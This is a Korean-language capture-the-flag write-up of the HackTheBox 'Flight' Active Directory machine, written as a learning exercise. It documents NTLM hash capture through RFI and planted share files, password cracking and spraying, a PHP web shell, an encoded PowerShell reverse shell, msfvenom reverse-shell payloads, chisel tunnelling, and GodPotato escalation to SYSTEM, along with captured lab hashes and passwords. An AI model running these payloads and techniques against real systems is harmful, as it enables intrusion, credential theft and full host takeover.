# HTB-FLIGHT
```bash
OS: Windows(AD)
DATE: 26.11.23
DIFFICULTY: Hard
```

## RECON
초기 정찰을 위해 nmap으로 포트 스캔 및 상세 스캔을 진행하였다.
```bash
nmap -p- -T4 IP | grep -oP '^\d+/tcp' | cut -d/ -f1 | paste -sd,
```
```bash
nmap -sC -sV -p 53,80,88,135,139,389,445,464,593,636,3268,3269,9389,49667,49673,49674,49693,50136 IP | tee nmap
```
스캔 결과 88, 389 등의 포트로 보아 AD 도메인 컨트롤러(DC) 서버임을 알 수 있었다. 그중 눈에 띄는 포트는 80번이었으므로, 웹 디렉토리와 서브도메인 퍼징을 진행하였다.
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://flight.htb/ -H "Host: FUZZ.flight.htb" -fs 7069
```
```bash
ffuf -u http://flight.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -r -c
```
그 결과 school이라는 서브도메인을 발견하였고, 이어서 school 서브도메인에 대해 다시 한번 퍼징을 진행하였다.
```bash
ffuf -u http://school.flight.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -r -c
```
하지만 별다른 정보는 얻지 못하였다.

## Initial Access
초기 정찰에서 확인한 school 도메인에 접속해 보았다. 접속 결과 여러 페이지를 `http://school.flight.htb/index.php?view=home.html`와 같은 형식으로 불러오고 있었다. 따라서 view 파라미터에 LFI 취약점이 있을 것으로 의심하여 여러 차례 점검을 진행하였으나 별다른 성과가 없어, RFI를 시도해 보았다. 먼저 SMB 서버를 열고 내 서버로 접속을 유도하는 방식을 시도하였다.
```bash
sudo responder -I tun0
```
```bash
curl http://school.flight.htb/index.php?view=//IP/share
```
```bash
sudo responder -I tun0

[SMB] NTLMv2-SSP Client   : 10.129.135.126
[SMB] NTLMv2-SSP Username : flight\svc_apache
[SMB] NTLMv2-SSP Hash     : svc_apache::flight:f8a82d5e671906bc:229CA14B8AB95765ACFBE029112345AD:0101000000000000003D714A9D7BDD01D9494FCE99F77E890000000002000800320055004E00430001001E00570049004E002D0049004F00450042004900310041004F004A003000420004003400570049004E002D0049004F00450042004900310041004F004A00300042002E00320055004E0043002E004C004F00430041004C0003001400320055004E0043002E004C004F00430041004C0005001400320055004E0043002E004C004F00430041004C0007000800003D714A9D7BDD0106000400020000000800300030000000000000000000000000300000F223693545E0968E31776F3BF51CE791BB43C488EE50885A8355DFDD6E42A7890A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003100370031000000000000000000
```
그 결과 svc_apache 유저의 해시를 획득하였다. 이를 hash 파일에 저장한 뒤 hashcat의 5600 모드로 크랙을 진행하였다.
```bash
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```
이로써 평문 비밀번호를 획득하였다. 평문 비밀번호를 얻은 뒤 셸 접속을 시도하였으나 접속 가능한 서비스가 없어, nxc로 접근 가능한 SMB 공유 목록을 확인해 보았다.
```bash
nxc smb IP -u svc_apache -p PASS --shares

SMB         10.129.135.126  445    g0               Share           Permissions            Remark
SMB         10.129.135.126  445    g0               -----           -----------            ------
SMB         10.129.135.126  445    g0               ADMIN$                                 Remote Admin
SMB         10.129.135.126  445    g0               C$                                     Default share
SMB         10.129.135.126  445    g0               IPC$            READ                   Remote IPC
SMB         10.129.135.126  445    g0               NETLOGON        READ                   Logon server share 
SMB         10.129.135.126  445    g0               Shared          READ                   
SMB         10.129.135.126  445    g0               SYSVOL          READ                   Logon server share 
SMB         10.129.135.126  445    g0               Users           READ                   
SMB         10.129.135.126  445    g0               Web             READ
```
그 결과 Shared, Users, Web 공유 폴더가 있음을 확인하였다. 관련 폴더에 모두 접근해 보았으나 별다른 정보는 얻지 못하였다. 이후 다른 유저가 동일한 비밀번호를 사용할 수도 있다고 판단하여, 획득한 크레덴셜로 도메인 유저 목록을 추출한 뒤 패스워드 스프레이를 진행하였다.
```bash
nxc smb flight.htb -u svc_apache -p 'S@Ss!K@*t13' --users |  awk '$5 !~ /^\[/ && $5 != "-Username-" {print $5}' | tee users
```
```bash
nxc smb flight.htb -u users -p 'S@Ss!K@*t13' --continue-on-success

[+] flight.htb\S.Moon:S@Ss!K@*t13
```
그 결과 s.moon 유저의 크레덴셜을 획득하였다. 마찬가지로 획득 직후 공유 폴더 목록을 확인해 보았다.
```bash
nxc smb IP -u s.moon -p PASS --shares

SMB         10.129.135.126  445    g0               Share           Permissions            Remark
SMB         10.129.135.126  445    g0               -----           -----------            ------
SMB         10.129.135.126  445    g0               ADMIN$                                 Remote Admin
SMB         10.129.135.126  445    g0               C$                                     Default share
SMB         10.129.135.126  445    g0               IPC$            READ                   Remote IPC
SMB         10.129.135.126  445    g0               NETLOGON        READ                   Logon server share 
SMB         10.129.135.126  445    g0               Shared          READ,WRITE             
SMB         10.129.135.126  445    g0               SYSVOL          READ                   Logon server share 
SMB         10.129.135.126  445    g0               Users           READ                   
SMB         10.129.135.126  445    g0               Web             READ 
```
그 결과 이전 계정과 달리 Shared 공유에 쓰기 권한이 생긴 것을 확인하였다. 따라서 앞서와 같은 NTLM 탈취 공격을 떠올렸고, `ntlm_theft.py`를 사용하여 NTLM 탈취용 페이로드 모음을 생성하였다.
```bash
python3 ntlm_theft.py --generate all --server IP --filename exploit
```
이후 mput으로 생성한 모든 파일을 업로드하였다.
```bash
smb > mput*

Put file exploit-(fulldocx).xml? y
putting file exploit-(fulldocx).xml as \exploit-(fulldocx).xml (50.2 kB/s) (average 50.2 kB/s)
Put file exploit-(externalcell).xlsx? y
NT_STATUS_ACCESS_DENIED opening remote file \exploit-(externalcell).xlsx
```
다만 업로드 가능한 파일과 불가능한 파일이 섞여 있어 모두 수동으로 시도하였다. 그 결과 다수의 파일과 함께 **desktop.ini** 파일도 업로드되었다. 이후 앞서와 같이 NTLM 해시를 수신할 서버를 켜고 대기하였다.
```bash
sudo responder -I tun0

[SMB] NTLMv2-SSP Hash     : c.bum::flight.htb:7bafb0dfe8b25d26:3DCC781EA1395DF0732182A7D42C0782:0101000000000000003753D59F7BDD01ECAC837C99AACE18000000000200080044004B003700340001001E00570049004E002D00560031004E00330049005A003500460045004F00370004003400570049004E002D00560031004E00330049005A003500460045004F0037002E0044004B00370034002E004C004F00430041004C000300140044004B00370034002E004C004F00430041004C000500140044004B00370034002E004C004F00430041004C0007000800003753D59F7BDD0106000400020000000800300030000000000000000000000000300000F223693545E0968E31776F3BF51CE791BB43C488EE50885A8355DFDD6E42A7890A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003100370031000000000000000000
```
그 결과 c.bum이라는 새로운 유저의 크레덴셜을 획득하였다. 이후 마찬가지로 SMB 공유 목록을 확인하였다.
```bash
nxc smb flight.htb -u C.BUM -p 'Tikkycoll_431012284' --shares

SMB         10.129.135.126  445    g0               Share           Permissions            Remark
SMB         10.129.135.126  445    g0               -----           -----------            ------
SMB         10.129.135.126  445    g0               ADMIN$                                 Remote Admin
SMB         10.129.135.126  445    g0               C$                                     Default share
SMB         10.129.135.126  445    g0               IPC$            READ                   Remote IPC
SMB         10.129.135.126  445    g0               NETLOGON        READ                   Logon server share 
SMB         10.129.135.126  445    g0               Shared          READ,WRITE             
SMB         10.129.135.126  445    g0               SYSVOL          READ                   Logon server share 
SMB         10.129.135.126  445    g0               Users           READ                   
SMB         10.129.135.126  445    g0               Web             READ,WRITE 
```
이번에는 Web 공유 폴더에 쓰기 권한이 생겼으므로 다시 접속해 보았다.
```bash
smbclient //flight.htb/Web -U C.BUM
```
접속 후 확인한 결과, 앞서 80번 서비스에서 보았던 flight.htb 및 school.flight.htb의 페이지들과 동일한 것으로 보였다. 따라서 flight.htb/images 경로에 웹쉘을 업로드하여 셸 접속을 시도하였다.
```php
<?=`$_GET[0]`?>
```
```bash
smb > put shell.php
```
이후 브라우저로 접속하여 웹쉘을 작동시켜 보았다.
```bash
http://flight.htb/images/shell.php?0=whoami

Volume in drive C has no label. Volume Serial Number is 1DF4-493D Directory of C:\xampp\htdocs\flight.htb\js 11/24/2026 01:00 AM
. 11/24/2026 01:00 AM
.. 02/23/2022 09:58 PM 293 cufon-replace.js 02/23/2022 09:58 PM 18,257 cufon-yui.js 02/23/2022 09:58 PM 1,381 html5.js 02/23/2022 09:58 PM 2,112 ie6_script_other.js 11/24/2026 12:57 AM
ie6_warning 02/23/2022 09:58 PM 72,326 jquery-1.4.2.js 02/23/2022 09:58 PM 77,618 Myriad_Pro_400.font.js 02/23/2022 09:58 PM 21,969 Myriad_Pro_italic_400.font.js 02/23/2022 09:58 PM 35,321 Myriad_Pro_italic_600.font.js 02/23/2022 09:58 PM 28,280 PIE.htc 11/24/2026 01:00 AM 30 shell.php 10 File(s) 257,587 bytes 3 Dir(s) 4,661,915,648 bytes free 
```
그 결과 웹쉘 업로드에 성공하였다. 이제 PowerShell 리버스쉘 명령어를 인코딩하여 셸을 획득하는 작업을 진행하였다.
```bash
cat > shell.ps1 < 'EOF'
$client = New-Object System.Net.Sockets.TCPClient('IP',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
EOF
```
```bash
cat shell.ps1 | iconv -t UTF-16LE | base64 -w0
```
페이로드를 인코딩한 뒤, 앞서의 웹쉘에서 `powershell -e`를 활용하여 실행하였다.
```bash
http://flight.htb/images/shell.php?0=powershell+-e+JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA1AC4AMQA3ADEAJwAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkACgA=
```
```bash
rlwrap nc -nlvp 4444

PS C:\xampp\htdocs\flight.htb\images
```
그 결과 apache 유저의 셸을 획득하였다. apache 유저보다 권한이 높은 c.bum 유저의 크레덴셜을 알고 있었으므로, 셸 안에서 계정을 전환하기 위해 runas를 사용하였다.
```powershell
runas /user:flight.htb\c.bum "cmd.exe"
```
하지만 대상 셸은 실제 터미널이 아니어서 대화형 프롬프트 입력이 불가능하였다. 따라서 네이티브 runas와 동일한 기능을 하되 비밀번호를 인자로 받아 프롬프트 없이 사용할 수 있는 **RunasCs**를 다운로드하여 사용하였다. 먼저 whoami 명령으로 동작을 확인하였다.
```powershell
.\RunasCs.exe c.bum Tikkycoll_431012284 "cmd /c whoami"

[*] Warning: The logon for user 'c.bum' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

flight\c.bum
```
정상적으로 실행됨을 확인한 뒤, 리스너를 열고 셸을 받아주었다.
```powershell
.\RunasCs.exe c.bum Tikkycoll_431012284 cmd.exe -r IP:5555
```
그 결과 c.bum 셸을 성공적으로 획득하였고, user 플래그까지 얻을 수 있었다.

![user](attach_real/Pasted%20image%2020261123144318.png)

## Privilege Escalation
셸을 획득한 뒤 여러 방면으로 열거(enumeration)를 진행하던 중, LISTENING 중인 서비스들을 확인하였다.
```powershell
netstat -ano | findstr LISTENING 

  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       5608
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       664
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       920
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       664
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       5608
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       664
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       920
  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       664
  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       664
  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       664
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       1872
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       500
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1108
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1552
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       664
  TCP    0.0.0.0:49673          0.0.0.0:0              LISTENING       664
  TCP    0.0.0.0:49674          0.0.0.0:0              LISTENING       664
  TCP    0.0.0.0:49686          0.0.0.0:0              LISTENING       3000
  TCP    0.0.0.0:55648          0.0.0.0:0              LISTENING       2496
  TCP    0.0.0.0:55651          0.0.0.0:0              LISTENING       644
  TCP    10.129.135.126:53      0.0.0.0:0              LISTENING       3000
  TCP    10.129.135.126:139     0.0.0.0:0              LISTENING       4
  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       3000
```
이로써 nmap으로는 발견하지 못했던 8000번 서비스를 확인하게 되었다. 따라서 포트 포워딩을 통해 로컬에서 접근해 보기로 하고, 먼저 로컬(Kali)에서 chisel 서버를 실행하였다.
```bash
./chisel server -p 8888 --reverse
```
이후 대상 셸에서 chisel 클라이언트로 서버에 연결하였다.
```powershell
.\chisel.exe client IP:8888 R:8000:127.0.0.1:8000
```
이후 브라우저에서 127.0.0.1:8000으로 접속해 보았다. 그 결과 지금까지 보지 못했던 새로운 티켓 웹사이트가 있었다. 서버 응답 헤더를 확인해 보니 `Server: Microsoft-IIS/...`로 시작하여, 해당 서비스가 IIS + ASP.NET 기반임을 알 수 있었다. IIS 사이트는 기본적으로 inetpub 하위에 위치하므로 셸에서 해당 경로를 확인하였고, 그 안의 **development** 폴더에 앞서 포트 포워딩으로 접속했던 사이트의 소스 코드가 들어 있었다. 따라서 이 경로에 aspx 리버스쉘을 업로드하면 다른 유저의 셸을 획득할 수 있다고 판단하여, 먼저 msfvenom으로 페이로드를 생성하였다.
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=5555 -a x64 -f aspx > shell.aspx
```
이후 페이로드를 대상 셸로 옮긴 뒤 `C:\inetpub\development\shell.aspx` 경로에 배치하였다. 리스너를 열고 브라우저에서 해당 위치로 접속해 보았다.
```bash
http://127.0.0.1/shell.aspx
```
```bash
rlwrap nc -nlvp 5555

c:\windows\system32\inetsrv
```
그 결과 `iis apppool` 계정의 셸을 획득하였다. 해당 계정에서 whoami /all을 실행하여 보유 권한을 확인하였다.
```powershell
whoami /all

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```
그 결과 **SeImpersonatePrivilege** 권한이 활성화되어 있음을 확인하였고, 비교적 최신 도구인 **GodPotato-NET4.exe**를 활용하여 권한 상승을 진행하였다. 먼저 msfvenom으로 .exe 페이로드를 생성하였다.
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4545 -a x64 -f exe > shell.exe
```
이 페이로드를 대상 셸로 옮긴 뒤 익스플로잇을 진행하였다.
```powershell
.\GodPotato-NET4.exe -cmd "cmd /c C:\Windows\Temp\shell.exe"
```
```bash
nc -nlvp 4545

system
```
이로써 SYSTEM 셸을 획득하였다.

![system](attach_real/Pasted%20image%2020261123151106.png)

## New Inform
- LFI만 있다고 생각하지 말고 RFI도 고려하자.
- Windows의 경우 SMB 서버를 열고 RFI를 확인하자.
- 여러 계정이 동일한 비밀번호를 사용할 수 있다고 가정하고 패스워드 스프레이를 진행하자.
- SMB에 쓰기 권한이 있으면 NTLM 탈취 공격을 떠올리자.
- NTLM 탈취 공격을 할 때는 ntlm_theft를 사용하여 페이로드 파일들을 생성하자.
- smbclient에서 mput으로 여러 파일을 한 번에 업로드할 수 있다.
- SMB 업로드 시 되는 파일과 안 되는 파일이 있을 수 있다.
- Windows 서버에서도 PHP 웹 서버가 돌아갈 수 있다. 경로에 xampp가 보이면 Apache+PHP 스택이므로 PHP 웹쉘을 올릴 수 있다는 신호다.
- Windows에서는 PHP 웹쉘을 올리더라도 리버스쉘은 PowerShell을 사용해야 한다. PHP 리버스쉘은 리눅스 전용이기 때문이다.
- Windows 웹쉘에서 리버스쉘을 띄울 때는 PowerShell 명령을 Base64(UTF-16LE)로 인코딩하여 실행하면 셸을 얻을 수 있다.
- 0.0.0.0으로 리스닝 중이어도 nmap에 잡히지 않는 서비스가 있으면 방화벽에 막힌 내부 전용 서비스일 수 있으니 확인하자.
- `netstat -ano | findstr LISTENING`으로 리스닝 포트를 확인하자.
- IIS + ASP.NET 서비스인 경우 .aspx 파일을 실행시켜 RCE가 가능하다.
- 내부 서비스가 IIS로 동작한다면 inetpub 경로에서 소스 및 파일을 확인하자.
- aspx 페이로드를 msfvenom으로 만들 때는 아키텍처에 맞게 `-a x64`를 지정하자.
- aspx 페이로드로 RCE를 하면 IIS가 코드를 실행하므로 App Pool 계정으로 셸이 들어온다. 따라서 업로드한 유저가 아닌 다른 유저의 셸을 획득할 수 있다.
- `SeImpersonatePrivilege` 권한이 있을 때는 (2019에서 동작하지 않는) 구형 Potato 도구 대신 최신 도구인 `GodPotato-NET4.exe`로 익스플로잇하자.
- GodPotato-NET4.exe를 사용할 때는 먼저 shell.exe 페이로드를 만든 뒤 진행한다.